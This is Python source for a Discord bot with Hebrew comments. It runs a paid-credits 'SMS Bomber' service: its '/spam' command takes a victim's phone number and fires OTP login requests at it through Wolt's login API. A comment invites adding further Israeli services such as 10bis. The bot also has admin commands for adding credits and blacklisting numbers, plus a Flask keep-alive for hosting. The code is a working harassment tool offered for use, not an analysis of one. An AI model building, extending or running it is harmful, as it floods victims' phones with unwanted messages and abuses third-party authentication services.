import discord
from discord import app_commands
from discord.ext import commands
import os, json, httpx, asyncio
from flask import Flask
from threading import Thread

# --- תיקון ל-Render (חובה!) ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Alive"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))

def keep_alive():
    Thread(target=run).start()

# --- הגדרות בוט ---
TOKEN = os.getenv("DISCORD_TOKEN")
DB_FILE = "database.json"

def get_data():
    if not os.path.exists(DB_FILE): return {"credits": {}, "blacklist": []}
    with open(DB_FILE, "r") as f: return json.load(f)

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ סונכרן כ-{self.user}")

bot = MyBot()

# --- הפקודות מהסרטון (אחד לאחד) ---

@bot.tree.command(name="credits", description="Check your current balance")
async def credits(interaction: discord.Interaction):
    data = get_data()
    balance = data["credits"].get(str(interaction.user.id), 0)
    await interaction.response.send_message(f"💰 היתרה שלך: `{balance}` קרדיטים.", ephemeral=True)

@bot.tree.command(name="addcredit", description="[ADMIN] Add credits to a user")
async def add_credit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not interaction.user.guild_permissions.administrator:
        return await interaction.response.send_message("❌ רק אדמין יכול!", ephemeral=True)
    data = get_data()
    uid = str(member.id)
    data["credits"][uid] = data["credits"].get(uid, 0) + amount
    save_data(data)
    await interaction.response.send_message(f"✅ נוספו {amount} קרדיטים ל-{member.mention}")

@bot.tree.command(name="blacklist_add", description="[ADMIN] Add phone to blacklist")
async def bl_add(interaction: discord.Interaction, phone: str):
    if not interaction.user.guild_permissions.administrator: return
    data = get_data()
    if phone not in data["blacklist"]: data["blacklist"].append(phone)
    save_data(data)
    await interaction.response.send_message(f"🚫 המספר {phone} נחסם.")

# --- מנוע שליחה (OTP) ---
async def send_otp(phone):
    # כאן נכנסים הקישורים (Wolt, 10bis וכו')
    async with httpx.AsyncClient() as client:
        # דוגמה לאתר אחד - תוכל להוסיף את השאר כאן
        await client.post("https://api.wolt.com/v1/user/login/otp", json={"phone": f"+972{phone[1:]}"})

@bot.tree.command(name="spam", description="Start SMS Bomber")
async def spam(interaction: discord.Interaction, phone: str):
    data = get_data()
    if phone in data["blacklist"]:
        return await interaction.response.send_message("❌ מספר חסום!", ephemeral=True)
    
    await interaction.response.send_message(f"💣 שולח OTP למספר {phone}...", ephemeral=True)
    await send_otp(phone)

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
